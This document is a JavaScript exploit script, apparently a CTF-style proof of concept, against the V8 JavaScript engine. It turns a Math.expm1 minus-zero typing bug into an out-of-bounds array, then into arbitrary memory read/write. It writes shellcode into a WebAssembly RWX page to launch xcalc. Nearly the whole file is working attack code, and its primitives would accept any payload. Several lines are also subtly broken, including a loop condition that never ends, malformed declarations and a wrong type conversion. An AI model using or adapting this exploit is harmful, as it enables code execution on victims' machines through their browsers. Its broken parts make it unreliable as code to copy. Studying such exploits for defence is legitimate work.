function hex(x)
{
	return '0x' + (x.toString(16)).padStart(16, 0);
}

function success(str, val){
    console.log("[+] " + str + " -> "+ hex(val));
}

function gc() 
{
    for (let i = 0; i < 100; i++) 
	{
        new ArrayBuffer(0x100000);
    }
}

class typeConvert
{
    constructor(){
        this.buf = new ArrayBuffer(8);
        this.f64 = new Float64Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.bytes = new Uint8Array(this.buf);
    }
    f2u(val){        //double ==> Uint64
        this.f64[0] = val;
        let tmp = Array.from(this.u32);
        return tmp[1] * 0x100000000 + tmp[0];
    }
    u2f(val){        //Uint64 ==> double
        let tmp = [];
        tmp[0] = parseInt(val % 0x100000000);
        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
        this.u32.set(tmp);
        return this.f64[0];
    }
}

var tC = new typeConvert();

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
let wasmFunc = wasmInstance.exports.main;

// ------------------------start------------------------------
var maxSize = 1028 * 8;
var oobArray = undefined;
var bufs = [];
var objs = [];
function foo(x){
	let tmp = {escape : -0};
	let idx = Object.is(Math.expm1(x), tmp.escape);
	idx *= 11;
	let a = [1.1, 1.2, 1.3];
	let b = [2.1, 2.2, 2.3];
	//let ab =  new ArrayBuffer(0xdead);
	//bufs.push(ab);
	//obj = {'a': 0x1234, 'b': 0x5678};
	//objs.push(obj);
	oobArray = b;
	a[idx] = tC.u2f(0x200000000000);
}
/**
print("foo(0)  : "+foo(0));
%OptimizeFunctionOnNextCall(foo);
foo("0");
%OptimizeFunctionOnNextCall(foo);
print("foo(0)  : "+foo(0));
print("foo(-0) : "+foo(-0));
*/
foo(0);
for(let i=0; i<0x10000; i++){
	foo("0");
}
foo(-0);
success("oobArray's length",oobArray.length);
//%DebugPrint(oobArray);
//%SystemBreak();

let buf = new ArrayBuffer(0xdead);
let obj={'a':0x1234,'b':0x5678};
//------------search-------------
let obj_b_offset;
// search obj.b offset
for(let i=0; i < maxSize; i++){
	let val = tC.f2u(oobArray[i]);
	if(val === 0x123400000000){
		obj_b_offset = i + 1;
		success("obj.b", obj_b_offset);
		break;
	}
}
// search buf's backing_store
let backing_store;
for(let i=0;maxSize;i++){
	let = val = tC.f2u(oobArray[i]);
	if(val === 0xdead){
		backing_store = i + 1;
		success("buf's backing_store offset in oobArray",backing_store);
		break;
	}
}

// -----------build R/W Primitive-------------
var dataView = new DataView(buf);

class ArbitraryRW{
	leakObj(target){
		obj.b = target;
		return tC.f2u(oobArray[obj_b_offset]) - 0x1;
	}
	read64(addr){
		oobArray[backing_store] = tC.u2f(addr);
		//let tmp = new Float64Array(buf,0,0x10);
		//return tC.f2u(tmp[0]);
		return tC.f2u(dataView.getFloat64(0, true));
	}
	write64(addr,value){
		oobArray[backing_store] = tC.u2f(addr);
		//let tmp = new Float64Array(buf,0,0x10);
		//tmp[0] = tC.u2f(value);
		return dataView.setFloat64(0, tC.f2u(value), True);
	}
	write(addr, payload){
		oobArray[backing_store] = tC.u2f(addr);
		for(let i=0; i<payload.length; i++){
			dataView.setUint8(i, payload[i]);
		}
	}
}
let wr = new ArbitraryRW();
// ---------------build down -----------------
wasmInsAddr = wr.leakObj(wasmInstance);
success("wasmIns_addr ->",wasmInsAddr);
// %DebugPrint(wasmInstance);
RWXAddr = wr.read64(wasmInsAddr+0xe8);
success("RWXAddr ->",RWXAddr);

function showCalc(){
	var shellcode = [0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x48, 0xb8, 0x2f, 0x78, 0x63, 0x61, 0x6c, 0x63, 0x00, 0x00, 0x50, 0x48, 0xb8, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x50, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xc0, 0x50, 0x57, 0x48, 0x89, 0xe6, 0x48, 0x31, 0xd2, 0x48, 0xc7, 0xc0, 0x3a, 0x30, 0x00, 0x00, 0x50, 0x48, 0xb8, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x50, 0x48, 0x89, 0xe2, 0x48, 0x31, 0xc0, 0x50, 0x52, 0x48, 0x89, 0xe2, 0x48, 0xc7, 0xc0, 0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x00];
	wr.write(RWXAddr, shellcode);
	wasmFunc();
}
showCalc();

